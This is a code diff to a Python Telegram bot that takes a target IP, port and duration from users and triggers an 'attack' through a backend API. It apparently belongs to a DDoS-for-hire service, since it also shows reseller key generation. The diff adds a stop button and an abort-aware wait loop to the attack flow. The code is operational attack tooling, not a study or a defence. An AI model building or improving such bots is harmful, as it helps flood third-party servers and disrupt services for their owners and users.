@@ -622,26 +622,27 @@ def execute_attack(message, target, port_str, time_str):
         "━━━━━━━━━━━━━━━━━━━━━━\n"
         "📊 <i>/status se live check kro</i> ⚡️"
     )
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack_btn"))
     bot.send_message(user_id, attack_msg, parse_mode="HTML")
     threading.Thread(target=run_attack_api, args=(message.chat.id, user_id, target, port, time_val)).start()
 
 def run_attack_api(chat_id, user_id, target, port, time_val):
     try:
-        # Build the exact JSON payload your FastAPI expects
-        payload = {
-            "target_ip": target,
-            "target_port": str(port),
-            "time": time_val
-        }
-        
-        # Fire the POST request to your Python Brain
+        payload = {"target_ip": target, "target_port": str(port), "time": time_val}
         resp = requests.post(API_LAUNCH_URL, json=payload, timeout=10)
         
         if resp.status_code == 200:
-            bot.send_message(chat_id, f"🚀 <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗮𝘂𝗻𝗰𝗵𝗲𝗱 𝗼𝗻 𝗦𝗲𝗿𝘃𝗲𝗿!</b> 🚀\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Duration:</b> {time_val}s", parse_mode="HTML")
+            # 💥 SMART SLEEP: Check every 1 second if the user aborted the attack
+            for _ in range(time_val):
+                if user_id not in active_attacks:
+                    # The Stop button was clicked! Exit silently without sending "Finished"
+                    return 
+                time.sleep(1)
             
-            # Keep the bot's internal sleep timer so /status works
-            time.sleep(time_val) 
+            # If the loop finishes without being stopped:
+            bot.send_message(chat_id, f"🚀 <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱!</b> 🚀\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Duration:</b> {time_val}s", parse_mode="HTML")
+            
         else: 
             bot.send_message(chat_id, f"⚠️ <b>API Error:</b> Server rejected the payload.", parse_mode="HTML")
             
@@ -1502,6 +1503,27 @@ def handle_all_buttons(call):
             msg = bot.send_message(user_id, "🎯 <b>Enter Target IP:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
             active_prompts[user_id] = msg.message_id
             bot.register_next_step_handler(msg, attack_step_ip)
+    elif action == "stop_attack_btn":
+        try:
+            # Fire the Abort command to the Python API
+            resp = requests.post(API_STOP_URL, json={}, timeout=10)
+            if resp.status_code == 200:
+                # Remove from active attacks so the Smart Sleep stops instantly
+                if user_id in active_attacks:
+                    del active_attacks[user_id]
+                
+                # Edit the original message to remove the button and show aborted text
+                bot.edit_message_text(
+                    "🛑 <b>𝗔𝗧𝗧𝗔𝗖𝗞 𝗔𝗕𝗢𝗥𝗧𝗘𝗗 𝗕𝗬 𝗨𝗦𝗘𝗥!</b> 🛑\nTarget has been released from the server.", 
+                    chat_id=user_id, 
+                    message_id=call.message.message_id, 
+                    parse_mode="HTML"
+                )
+                bot.answer_callback_query(call.id, "Attack Stopped Successfully!")
+            else:
+                bot.answer_callback_query(call.id, "API Error: Could not stop.", show_alert=True)
+        except:
+            bot.answer_callback_query(call.id, "Connection Failed: API Offline.", show_alert=True)        
 
     # --- RESELLER ACTIONS ---
     elif action == "cb_genkey":
